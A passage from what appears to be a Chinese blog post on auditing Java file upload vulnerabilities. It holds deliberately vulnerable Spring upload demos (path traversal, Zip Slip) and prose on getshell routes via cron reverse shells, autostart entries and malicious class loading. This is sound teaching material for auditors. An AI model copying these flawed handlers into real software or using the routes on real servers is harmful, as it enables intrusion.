fileTypeMap.put(<span class="hljs-string">&quot;7061636b616765207765&quot;</span>, <span class="hljs-string">&quot;java&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;406563686f206f66660d&quot;</span>, <span class="hljs-string">&quot;bat&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;1f8b0800000000000000&quot;</span>, <span class="hljs-string">&quot;gz&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;6c6f67346a2e726f6f74&quot;</span>, <span class="hljs-string">&quot;properties&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;cafebabe0000002e0041&quot;</span>, <span class="hljs-string">&quot;class&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;49545346030000006000&quot;</span>, <span class="hljs-string">&quot;chm&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;04000000010000001300&quot;</span>, <span class="hljs-string">&quot;mxp&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;504b0304140006000800&quot;</span>, <span class="hljs-string">&quot;docx&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;6431303a637265617465&quot;</span>, <span class="hljs-string">&quot;torrent&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;6D6F6F76&quot;</span>, <span class="hljs-string">&quot;mov&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;FF575043&quot;</span>, <span class="hljs-string">&quot;wpd&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;CFAD12FEC5FD746F&quot;</span>, <span class="hljs-string">&quot;dbx&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;2142444E&quot;</span>, <span class="hljs-string">&quot;pst&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;AC9EBD8F&quot;</span>, <span class="hljs-string">&quot;qdf&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;E3828596&quot;</span>, <span class="hljs-string">&quot;pwl&quot;</span>);<br>    fileTypeMap.put(<span class="hljs-string">&quot;2E7261FD&quot;</span>, <span class="hljs-string">&quot;ram&quot;</span>);<br>&#125;<br><br><br><br><span class="hljs-comment">//通过文件头魔数获取文件类型</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getFileTypeByMagicNumber</span><span class="hljs-params">(InputStream inputStream)</span> &#123;<br>    <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[default_check_length];<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// 获取文件头前三位魔数的二进制</span><br>        inputStream.read(bytes, <span class="hljs-number">0</span>, bytes.length);<br>        <span class="hljs-comment">// 文件头前三位魔数二进制转为16进制</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> bytesToHexString(bytes);<br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, String&gt; item : fileTypeMap.entrySet()) &#123;<br>            <span class="hljs-keyword">if</span> (code.equals(item.getKey())) &#123;<br>                <span class="hljs-keyword">return</span> item.getValue();<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>        e.printStackTrace();<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>&#125;<br><br><br><span class="hljs-comment">//字节数组转为16进制</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">bytesToHexString</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> &#123;<br>    <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">stringBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; bytes.length; i++) &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">v</span> <span class="hljs-operator">=</span> bytes[i] &amp; <span class="hljs-number">0xFF</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">hv</span> <span class="hljs-operator">=</span> Integer.toHexString(v);<br>        <span class="hljs-keyword">if</span> (hv.length() &lt; <span class="hljs-number">2</span>) &#123;<br>            stringBuilder.append(<span class="hljs-number">0</span>);<br>        &#125;<br>        stringBuilder.append(hv);<br>    &#125;<br>    <span class="hljs-keyword">return</span> stringBuilder.toString();<br>&#125;<br></code></pre></td></tr></table></figure>

<h5 id="注：-1"><a href="#注：-1" class="headerlink" title="注："></a>注：</h5><p>1、Content-Type校验文件可伪造Content-Type绕过</p>
<p>2、文件头校验可通过图片马形式绕过</p>
<h3 id="3、审计文件保存路径"><a href="#3、审计文件保存路径" class="headerlink" title="3、审计文件保存路径"></a>3、审计文件保存路径</h3><h4 id="文件保存至非本地"><a href="#文件保存至非本地" class="headerlink" title="文件保存至非本地"></a>文件保存至非本地</h4><h5 id="保存至云："><a href="#保存至云：" class="headerlink" title="保存至云："></a>保存至云：</h5><p>即上传的文件上传至云服务OSS, 例如：七牛云 OSS，阿里云OSS、腾讯云OSS等。若保存在OSS上，OSS不会解析上传的webshell，故不存在漏洞利用。</p>
<p>因文件上传至OSS需发起HTTP请求，可通过代码查看保存文件处存在<strong>OSSClient</strong>类似字样、pom中存在相应云服务器依赖，查看配置文件中云服务endpoint、accessKeyId、accessKeySecret、bucketName、callback、prefix等配置。</p>
<h5 id="保存至内部文件存储系统、"><a href="#保存至内部文件存储系统、" class="headerlink" title="保存至内部文件存储系统、"></a>保存至内部文件存储系统、</h5><p>此保存与云保存相同，均需发送请求及存在相应配置，审计过程中具体分析即可。此类保存文件方式也不存在可直接利用webshell造成漏洞利用。</p>
<h5 id="注：-2"><a href="#注：-2" class="headerlink" title="注："></a>注：</h5><p>文件保存至非当前WEB服务器仍存在风险，即相应文件系统存在配置等造成的权限漏洞、文件覆盖、任意文件访问等，但此风险与任意文件上传漏洞无关。</p>
<h4 id="文件保存至本地"><a href="#文件保存至本地" class="headerlink" title="文件保存至本地"></a>文件保存至本地</h4><p>若文件保存至本地则项目配置文件中存在相应配置，值为一个固定路径：</p>
<p><img src="/image/image-0.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>或存在于文件上传功能点相应代码中存在路径：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//文件上传demo</span><br><span class="hljs-meta">@PostMapping(&quot;upload5&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">upload5</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> MultipartFile file)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>    <span class="hljs-keyword">if</span> (file != <span class="hljs-literal">null</span>)&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;E:\\file\\&quot;</span>;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">originalFilename</span> <span class="hljs-operator">=</span> file.getOriginalFilename();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">filepath</span> <span class="hljs-operator">=</span> path + originalFilename;<br><br>        <span class="hljs-type">File</span> <span class="hljs-variable">saveFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(filepath);<br><br>        file.transferTo(saveFile);<br><br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;文件上传成功！！！文件地址为&quot;</span> + filepath;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;上传失败，上传文件为空&quot;</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="保存路径是否为解析路径"><a href="#保存路径是否为解析路径" class="headerlink" title="保存路径是否为解析路径"></a>保存路径是否为解析路径</h4><h5 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h5><p>若为tomcat部署，Tomcat支持将JSP文件解析为Servlet。默认情况下，JSP文件位于Web应用程序Webapp目录中，并使用“.jsp”作为文件扩展名。</p>
<h5 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h5><p>若为WebLogic，WebLogic支持将JSP文件解析为Servlet。默认情况下，JSP文件位于Web应用程序webroot目录中，并使用“.jsp”作为文件扩展名。</p>
<h5 id="Spring-Boot"><a href="#Spring-Boot" class="headerlink" title="Spring Boot"></a>Spring Boot</h5><p>Spring Boot可配置多种解析器，一般为thymeleaf，也可通过配置解析jsp(实际很少使用)，但此类情况利用面很小，因为需要配合controller使用，即无论是thymeleaf还是jsp视图解析均需根据controller返回的视图名选择文件解析，也就是说要存在一个controller能返回上传的文件的视图名，并且，此controller接口需未被访问过，因为访问过后，该视图将加载在内存中，再次访问会从内存中获取，即使修改文件也不会再次加载重新进行渲染，故Spring Boot下文件上传webshell解析影响及其有限，实战中很难利用。</p>
<h4 id="上传文件名是否修改"><a href="#上传文件名是否修改" class="headerlink" title="上传文件名是否修改"></a>上传文件名是否修改</h4><h5 id="修改上传名后保存"><a href="#修改上传名后保存" class="headerlink" title="修改上传名后保存"></a>修改上传名后保存</h5><p>即对上传文件进行重命名后保存，常见重命名方式为重命名为时间戳或UUID。demo如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//文件上传demo</span><br><span class="hljs-meta">@PostMapping(&quot;upload6&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">upload6</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> MultipartFile file)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>    <span class="hljs-keyword">if</span> (file != <span class="hljs-literal">null</span>)&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;E:\\file\\&quot;</span>;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">originalFilename</span> <span class="hljs-operator">=</span> file.getOriginalFilename();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">fileSuffix</span> <span class="hljs-operator">=</span> originalFilename.substring(originalFilename.lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>)).toLowerCase();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">simpleUUID</span> <span class="hljs-operator">=</span> IdUtil.simpleUUID();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">filepath</span> <span class="hljs-operator">=</span> path + simpleUUID + fileSuffix;<br><br>        <span class="hljs-type">File</span> <span class="hljs-variable">saveFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(filepath);<br><br>        file.transferTo(saveFile);<br><br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;文件上传成功！！！文件地址为&quot;</span> + filepath;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;上传失败，上传文件为空&quot;</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<h5 id="未修改上传直接保存"><a href="#未修改上传直接保存" class="headerlink" title="未修改上传直接保存"></a>未修改上传直接保存</h5><p>对上传文件名直接进行拼接保存，存在以下三个风险点：</p>
<h6 id="1、若返回包中返回文件名并拼接至html中，可能会导致XSS"><a href="#1、若返回包中返回文件名并拼接至html中，可能会导致XSS" class="headerlink" title="1、若返回包中返回文件名并拼接至html中，可能会导致XSS"></a>1、若返回包中返回文件名并拼接至html中，可能会导致XSS</h6><h6 id="2、可在文件中插入SQL语句，造成二次注入"><a href="#2、可在文件中插入SQL语句，造成二次注入" class="headerlink" title="2、可在文件中插入SQL语句，造成二次注入"></a>2、可在文件中插入SQL语句，造成二次注入</h6><h6 id="3、可跨目录上传"><a href="#3、可跨目录上传" class="headerlink" title="3、可跨目录上传"></a>3、可跨目录上传</h6><p>即对上传文件名直接进行拼接保存，存在以下三个风险点：</p>
<p>可通过 ..&#x2F; 进行跨目录上传，即可控制文件上传路径。若为此情况若web系统具有系统高权限则存在很大风险。在linux下，可以通过写入计划任务反弹shell;在windows下高权下可以通过写自启动的方式getshell。</p>
<p>demo如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//文件上传demo</span><br><span class="hljs-meta">@PostMapping(&quot;upload5&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">upload5</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> MultipartFile file)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>    <span class="hljs-keyword">if</span> (file != <span class="hljs-literal">null</span>)&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;E:\\file\\&quot;</span>;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">originalFilename</span> <span class="hljs-operator">=</span> file.getOriginalFilename();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">filepath</span> <span class="hljs-operator">=</span> path + originalFilename;<br><br>        <span class="hljs-type">File</span> <span class="hljs-variable">saveFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(filepath);<br><br>        file.transferTo(saveFile);<br><br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;文件上传成功！！！文件地址为&quot;</span> + filepath;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;上传失败，上传文件为空&quot;</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/image/image-1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><img src="/image/image-2.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h6 id="注：不可跨目录上传demo"><a href="#注：不可跨目录上传demo" class="headerlink" title="注：不可跨目录上传demo"></a>注：不可跨目录上传demo</h6><p>即对上传文件名进行处理，不可跨目录上传，demo如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">FILENAME_PATTERN</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;[a-zA-Z0-9_\\-\\|\\.\\u4e00-\\u9fa5]+&quot;</span>;<br><br><span class="hljs-comment">//文件上传demo</span><br><span class="hljs-meta">@PostMapping(&quot;upload7&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">upload7</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> MultipartFile file)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>    <span class="hljs-keyword">if</span> (file != <span class="hljs-literal">null</span>)&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;C:\\file\\&quot;</span>;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">originalFilename</span> <span class="hljs-operator">=</span> file.getOriginalFilename();<br><br>        <span class="hljs-keyword">if</span>(isValidFilename(originalFilename))&#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">filepath</span> <span class="hljs-operator">=</span> path + originalFilename;<br><br>            <span class="hljs-type">File</span> <span class="hljs-variable">saveFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(filepath);<br><br>            file.transferTo(saveFile);<br>            <br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;文件上传成功！！！文件地址为&quot;</span> + filepath;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;上传失败，上传文件为空&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="4、Zip-Slip"><a href="#4、Zip-Slip" class="headerlink" title="4、Zip Slip"></a>4、Zip Slip</h3><p>在Java中，Zip Slip漏洞可能影响使用Java的Zip文件压缩和解压缩的库和框架，例如Java的原生Zip库、Apache Commons Compress库和Spring框架等。</p>
<p>为了防止Zip Slip漏洞，开发人员应该在解压缩Zip文件之前验证Zip文件中的每个文件路径是否指向预期的目录，可以使用绝对路径来确保解压缩的文件都在预期的目录中。还可以使用像ZipFileEntrySource这样的库来解决Zip Slip漏洞问题。</p>
<p>已发现受Zip Slip影响的项目链接：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/snyk/zip-slip-vulnerability">https://github.com/snyk/zip-slip-vulnerability</a></p>
<p>漏洞demo:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//文件上传 Zip Slip demo</span><br><span class="hljs-meta">@PostMapping(&quot;upload8&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">upload8</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> MultipartFile file)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>    <span class="hljs-keyword">if</span> (file != <span class="hljs-literal">null</span>)&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;E:\\file\\&quot;</span>;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">originalFilename</span> <span class="hljs-operator">=</span> file.getOriginalFilename();<br><br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> file.getInputStream();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">filepath</span> <span class="hljs-operator">=</span> path + originalFilename;<br><br>        <span class="hljs-type">File</span> <span class="hljs-variable">saveFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(filepath);<br><br>        file.transferTo(saveFile);<br><br>        ZipUtil.unpack(saveFile, <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;E:\\file\\zip\\&quot;</span>));<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;文件上传成功！！！文件地址为&quot;</span> + filepath;<br><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;上传失败，上传文件为空&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="三、JAVA常见框架下任意文件上传漏洞getshell"><a href="#三、JAVA常见框架下任意文件上传漏洞getshell" class="headerlink" title="三、JAVA常见框架下任意文件上传漏洞getshell"></a>三、JAVA常见框架下任意文件上传漏洞getshell</h2><h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><p>Tomcat可直接解析JSP文件，但JSP文件必须位于Web应用程序的Web内容根目录下的“webapps”目录中。每个Web应用程序都应该有自己的目录，其中包含了它的JSP文件和其他相关文件。JSP文件通常存储在相应项目文件中的“WEB-INF”目录下的“jsp”子目录中，这是Tomcat服务器默认查找JSP文件的位置。若需其他目录解析，则需要在Tomcat的配置文件中进行相应的更改。</p>
<h3 id="WebLogic"><a href="#WebLogic" class="headerlink" title="WebLogic"></a>WebLogic</h3><p>在WebLogic服务器中，JSP文件可以位于Web应用程序的任何位置，通常存储在Web应用程序的“webroot”目录或其子目录中。与Tomcat不同，WebLogic服务器可以配置多个JSP文件存储位置，这些位置称为JSP编译目录。默认情况下，WebLogic服务器会在“webroot”目录下查找JSP文件，可以通过配置WebLogic的“weblogic.xml”文件中的“jsp-descriptor”元素来更改JSP文件的位置。</p>
<h3 id="Spring-boot"><a href="#Spring-boot" class="headerlink" title="Spring boot"></a>Spring boot</h3><p>Spring boot项目一般打包为一个jar包进行运行，jar包内容如下：</p>
<p><img src="/image/image-3.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>BOOT-INF为项目主要文件</p>
<p><img src="/image/image-4.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>classes 文件夹为程序开发的代码，包括java文件编译后的class文件及模板文件（.html、.js、.css等前端文件）</p>
<p><img src="/image/image-5.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>lib为依赖包</p>
<p>META-INF为maven配置。。。</p>
<p><img src="/image/image-6.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>此时项目为jar包运行，所以无法在其运行的时候往 classpath 中增加文件。</p>
<p>目前web主流开发为前后端分离开发，spring boot 项目多以 RESTful API 接口形式前端提供服务，很少解析thymeleaf、jsp等框架，即使解析也需配合controller才可访问，具体原因在上述 保存路径是否为解析路径-Spring boot中已详细说明。</p>
<p>目前Spring boot中任意文件上传(写入)分为两种思路，均需可控制文件上传(写入)路径：</p>
<h4 id="思路1"><a href="#思路1" class="headerlink" title="思路1"></a>思路1</h4><h5 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h5><p>在linux下且高权限的情况下，可以通过写入计划任务反弹shell。在windows下高权下可以通过写自启动的方式getshell。</p>
<h5 id="利用要求"><a href="#利用要求" class="headerlink" title="利用要求"></a>利用要求</h5><p>1、高权限可写入计划任务文件夹</p>
<p>2、可上传.sh、.exe、.dll格式文件</p>
<h4 id="思路2"><a href="#思路2" class="headerlink" title="思路2"></a>思路2</h4><h5 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h5><p>利用类加载机制，往服务器上传恶意jar或class文件，通过利用链使其加载上传的恶意类，造成任意代码执行，从而getshell</p>
<h5 id="利用要求-1"><a href="#利用要求-1" class="headerlink" title="利用要求"></a>利用要求</h5><p>1、服务器JDK&#x2F;JRE所在目录(此目录一般为固定目录，可暴力猜解目录)</p>
<p>2、较高权限有JDK&#x2F;JRE目录写入权限</p>
<p>3、可上传.jar、.class等格式文件</p>
<h2 id="四、Spring-Boot-任意文件上传-写入-getshell分析"><a href="#四、Spring-Boot-任意文件上传-写入-getshell分析" class="headerlink" title="四、Spring Boot 任意文件上传(写入)getshell分析"></a>四、Spring Boot 任意文件上传(写入)getshell分析</h2><h3 id="JAVA中的类加载与类初始化"><a href="#JAVA中的类加载与类初始化" class="headerlink" title="JAVA中的类加载与类初始化"></a>JAVA中的类加载与类初始化</h3><p>在Java中，类加载（Class Loading）和类初始化（Class Initialization）是类加载过程中的两个不同阶段。类加载和类初始化是类加载过程中的两个不同阶段。类加载是将类的字节码文件从磁盘或网络中读取到内存中，为其创建一个 Class 对象；而类初始化是在类被首次使用时，为其初始化其静态成员变量，包括静态变量和静态代码块。</p>
<h4 id="类加载"><a href="#类加载" class="headerlink" title="类加载"></a>类加载</h4><p>类加载是将Java类文件加载到内存中，并在JVM中创建对应的Java类的过程。当 Java 程序在运行时需要某个类时，类加载器会按照一定的查找顺序（例如 Bootstrap ClassLoader、Extension ClassLoader、System ClassLoader 等）来查找并加载该类。在加载过程中，Java 虚拟机（JVM）将类的二进制数据加载到内存中，并在方法区（Method Area）中创建一个 Class 对象，该对象包含了类的各种元数据信息，如类名、父类名、实现的接口、字段、方法等。</p>
<p>类加载的过程包括加载、链接和初始化三个步骤。在加载阶段，类加载器从指定的路径查找字节码文件，并将其读入内存中。在链接阶段，类加载器将类的字节码文件转换为可执行的Java类，并进行验证、准备和解析等操作。在初始化阶段，类加载器执行类的初始化代码，包括静态变量初始化和静态块初始化等。</p>
<h4 id="类初始化"><a href="#类初始化" class="headerlink" title="类初始化"></a>类初始化</h4><p>类初始化是指Java类被首次加载到内存中时，执行类中所有的静态初始化代码的过程。在这个过程在JVM 将为该类初始化其静态成员变量，包括静态变量和静态代码块，静态初始化代码可以是静态变量赋值或静态块中的代码。类初始化是一个类级别的操作，只有在类被首次加载到内存中时才会执行，且只会执行一次。类初始化的时机是在类被装载后，且在首次使用该类之前触发。在类初始化期间，JVM 将为所有静态成员变量分配内存空间，并将它们初始化为默认值或显式指定的值，然后依次执行静态代码块中的代码。</p>
<h4 id="代码详述"><a href="#代码详述" class="headerlink" title="代码详述"></a>代码详述</h4><p>存在以下两个类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;MyClass static block is initialized&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyClass</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;MyClass constructor is called&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Before creating MyClass object&quot;</span>);<br><br>        <span class="hljs-comment">// 装载MyClass类</span><br>        Class&lt;?&gt; cls = MyClass.class;<br><br>        System.out.println(<span class="hljs-string">&quot;After loading MyClass class&quot;</span>);<br><br>        <span class="hljs-comment">// 创建MyClass对象</span><br>        <span class="hljs-type">MyClass</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyClass</span>();<br><br>        System.out.println(<span class="hljs-string">&quot;After creating MyClass object&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>运行Main类，结果如下：</p>
<p><img src="/image/image-7.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>当程序首次加载MyClass类时，静态代码块被执行并输出 “MyClass static block is initialized”。而在程序创建MyClass对象之前，静态代码块已经被执行并且静态变量已经被初始化了。接着，程序创建了一个MyClass对象并调用其构造函数。在这个过程中，程序执行了类的初始化，即为静态变量分配内存并进行初始化。</p>
<p>更改代码</p>
